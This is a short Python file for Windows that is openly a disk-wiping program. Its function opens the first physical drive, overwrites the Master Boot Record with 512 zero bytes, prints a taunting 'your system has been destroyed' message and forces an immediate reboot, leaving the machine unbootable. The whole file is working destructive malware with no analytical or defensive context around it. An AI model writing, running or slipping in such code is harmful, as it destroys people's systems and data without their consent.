# Status - OK
import win32con
import win32file
from sys import exit
from os import system

# the function will overwrite the MasterBootRecord rendering the system unbootable
def OverWriteMBR():

    ACCESS = win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE
    SHARE_MODE = win32con.GENERIC_READ | win32con.GENERIC_WRITE
    ACTION = win32con.OPEN_EXISTING
    ATTRIBUTE = win32con.FILE_ATTRIBUTE_NORMAL
    magicBytes = b"\x00" * 512

    HANDLE = win32file.CreateFileW("\\\\.\\PhysicalDrive0", SHARE_MODE, ACCESS, None, ACTION, ATTRIBUTE, 0)

    if HANDLE == win32file.INVALID_HANDLE_VALUE:
        win32file.CloseHandle(HANDLE)
        exit(0)

    if win32file.WriteFile(HANDLE, magicBytes, None):
        print("Congrats, your system has been destroyed !!")
        system("shutdown /r /t 3 /f")        
